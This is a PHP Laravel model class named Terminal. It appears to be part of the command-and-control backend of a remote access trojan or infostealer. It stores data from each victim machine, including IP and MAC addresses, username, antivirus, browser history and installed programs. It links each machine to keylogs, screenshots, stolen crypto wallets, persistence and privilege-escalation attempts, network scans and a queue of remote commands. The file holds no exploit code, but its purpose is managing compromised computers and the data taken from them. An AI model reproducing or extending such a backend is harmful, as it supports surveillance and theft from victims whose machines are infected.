<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\HasMany;

class Terminal extends Model
{
    protected $primaryKey = 'id';
    public $incrementing = false;
    protected $keyType = 'string';
    
    protected $fillable = [
        'id',
        'ip',
        'local_ip',
        'mac_address',
        'hostname',
        'username',
        'os',
        'arch',
        'version',
        'status',
        'system_info',
        'is_elevated',
        'gpu',
        'antivirus',
        'disks',
        'network_interfaces',
        'browser_history',
        'installed_programs',
        'last_seen_at',
        'first_seen_at',
    ];
    
    protected $casts = [
        'system_info' => 'array',
        'disks' => 'array',
        'network_interfaces' => 'array',
        'browser_history' => 'array',
        'installed_programs' => 'array',
        'is_elevated' => 'boolean',
        'last_seen_at' => 'datetime',
        'first_seen_at' => 'datetime',
    ];
    
    /**
     * Check if terminal is online (seen in last 5 minutes)
     */
    public function getIsOnlineAttribute(): bool
    {
        return $this->last_seen_at && $this->last_seen_at->diffInMinutes(now()) < 5;
    }
    
    // Relationships
    public function keylogs(): HasMany
    {
        return $this->hasMany(Keylog::class, 'terminal_id');
    }
    
    public function telemetryLogs(): HasMany
    {
        return $this->hasMany(TelemetryLog::class, 'terminal_id');
    }
    
    public function persistenceAttempts(): HasMany
    {
        return $this->hasMany(PersistenceAttempt::class, 'terminal_id');
    }
    
    public function privilegeEscalationAttempts(): HasMany
    {
        return $this->hasMany(PrivilegeEscalationAttempt::class, 'terminal_id');
    }
    
    public function networkScans(): HasMany
    {
        return $this->hasMany(NetworkScan::class, 'terminal_id');
    }
    
    public function commandsQueue(): HasMany
    {
        return $this->hasMany(CommandQueue::class, 'terminal_id');
    }
    
    public function screenshots(): HasMany
    {
        return $this->hasMany(Screenshot::class, 'terminal_id');
    }
    
    public function cryptoWallets(): HasMany
    {
        return $this->hasMany(CryptoWallet::class, 'terminal_id');
    }
}
